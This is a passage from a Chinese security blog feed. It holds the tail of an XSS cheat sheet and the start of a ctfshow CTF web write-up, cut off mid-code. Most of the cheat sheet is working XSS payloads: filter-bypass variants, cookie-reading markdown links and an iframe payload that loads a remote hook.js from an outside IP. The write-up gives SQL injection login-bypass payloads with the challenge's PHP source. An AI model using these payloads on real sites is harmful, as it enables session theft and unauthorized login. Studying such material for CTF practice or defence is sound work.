class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="常见绕过技巧"><a href="#常见绕过技巧" class="headerlink" title="常见绕过技巧"></a>常见绕过技巧</h1><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">oNeRrOr</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">OnErRoR</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(<span class="symbol">&amp;quot;</span>M<span class="symbol">&amp;quot;</span>)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mArQuEe</span> <span class="attr">OnScRoLl</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MaRqUeE</span> <span class="attr">oNsCrOlL</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="各种-alert"><a href="#各种-alert" class="headerlink" title="各种 alert"></a>各种 alert</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;1&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>(alert)(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>a=alert,a(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>[1].find(alert)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">&quot;a&quot;</span>+<span class="string">&quot;l&quot;</span>+<span class="string">&quot;e&quot;</span>+<span class="string">&quot;r&quot;</span>+<span class="string">&quot;t&quot;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="regexp">/al/</span>.source+<span class="regexp">/ert/</span>.source](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="regexp">/a/</span>.source+<span class="regexp">/l/</span>.source+<span class="regexp">/e/</span>.source+<span class="regexp">/r/</span>.source+<span class="regexp">/t/</span>.source](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/0/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/00/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/000/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/M/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Chrome-XSS-auditor-绕过"><a href="#Chrome-XSS-auditor-绕过" class="headerlink" title="Chrome XSS auditor 绕过"></a>Chrome XSS auditor 绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?param=https://&amp;param=@z.exeye.io/import%20rel=import%3E</span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">,alert(1)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">,alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">s+=<span class="string">&quot;l&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">\...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(s)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="jquery-sourceMappingURL"><a href="#jquery-sourceMappingURL" class="headerlink" title="jquery sourceMappingURL"></a>jquery sourceMappingURL</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> a=<span class="number">1</span><span class="comment">//@ sourceMappingURL=//xss.site</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="图片名"><a href="#图片名" class="headerlink" title="图片名"></a>图片名</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span>.gif</span><br></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image:url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="MarkDown"><a href="#MarkDown" class="headerlink" title="MarkDown"></a>MarkDown</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript:prompt(document.cookie</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">j a v a s c r i p t:prompt(document.cookie</span>))</span><br><span class="line">&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;</span><br><span class="line">,→#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">![<span class="string">a&#x27;&quot;`onerror=prompt(document.cookie)</span>](<span class="link">x</span>)</span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript:window.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</span>)</span><br><span class="line">![<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</span>)</span><br></pre></td></tr></table></figure><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">var sc = document.createElement(&quot;scr&quot; + &quot;ipt&quot;);</span></span></span><br><span class="line"><span class="string"><span class="tag">sc.type = &quot;text/javascr&quot; + &quot;ipt&quot;;</span></span></span><br><span class="line"><span class="string"><span class="tag">sc.src = &quot;http://1.2.3.4/js/hook.js&quot;;</span></span></span><br><span class="line"><span class="string"><span class="tag">document.body.appendChild(sc);</span></span></span><br><span class="line"><span class="string"><span class="tag">&#x27;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=&lt;<span class="attr">svg</span>/<span class="attr">o</span>&amp;#<span class="attr">x6E</span>;<span class="attr">load</span>&amp;<span class="attr">equals</span>;<span class="attr">alert</span>&amp;<span class="attr">lpar</span>;<span class="attr">1</span>)&amp;<span class="attr">gt</span>;&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://baidu.com</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span>&lt;/iframe</span><br></pre></td></tr></table></figure><h2 id="form"><a href="#form" class="headerlink" title="form"></a>form</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Link&quot;</span> <span class="attr">Content</span>=<span class="string">&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考文档：web学习安全手册"><a href="#参考文档：web学习安全手册" class="headerlink" title="参考文档：web学习安全手册"></a>参考文档：web学习安全手册</h1>]]></content>
      
      
      <categories>
          
          <category> Web-基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 跨站脚本攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web刷题记录</title>
      <link href="/2021/08/06/ctfshow-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/08/06/ctfshow-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="web9：mysql使用md5-password-true-绕过登录"><a href="#web9：mysql使用md5-password-true-绕过登录" class="headerlink" title="web9：mysql使用md5($password,true)绕过登录"></a>web9：mysql使用<code>md5($password,true)</code>绕过登录</h1><h2 id="md5函数介绍"><a href="#md5函数介绍" class="headerlink" title="md5函数介绍"></a>md5函数介绍</h2><pre><code>md5(string,raw)</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。要计算的字符串。</td></tr><tr><td>raw</td><td>可选。<br>- 默认不写为FALSE：32位16进制的字符串<br>- TRUE：16位原始二进制格式的字符串</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure><h2 id="题目源码index-phps"><a href="#题目源码index-phps" class="headerlink" title="题目源码index.phps"></a>题目源码<code>index.phps</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现输入的password是经过<code>md5($password,true)</code>处理的，而在mysql中在用作布尔型判断时，以数字开头的字符串会被当做整型数，进而布尔值为真</p><p>因此，密码输入<code>ffifdyop</code>后查询语句变为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6]!r,b&#x27;</span>;</span><br></pre></td></tr></table></figure><p>与下列语句等效，因此可以成功登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure><h1 id="web10：使用group-by和with-rollup绕过登录"><a href="#web10：使用group-by和with-rollup绕过登录" class="headerlink" title="web10：使用group by和with rollup绕过登录"></a>web10：使用<code>group by</code>和<code>with rollup</code>绕过登录</h1><h2 id="题目源码index-phps-1"><a href="#题目源码index-phps-1" class="headerlink" title="题目源码index.phps"></a>题目源码<code>index.phps</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>)!=strlen(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出过滤比较全面，也无法双写绕过</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=&amp;username=&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#</span><br></pre></td></tr></table></figure><p>因为加入with rollup后 password有一行为NULL，只要输入空密码使得（NULL==NULL）即可满足<code>$password==$row[&#39;password&#39;]</code>的限制成功登陆。</p><h1 id="web14：sql演示套娃题"><a href="#web14：sql演示套娃题" class="headerlink" title="web14：sql演示套娃题"></a>web14：sql演示套娃题</h1><h2 id="网页显示源码"><a href="#网页显示源码" class="headerlink" title="网页显示源码"></a>网页显示源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = intval(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    sleep(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$c</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span 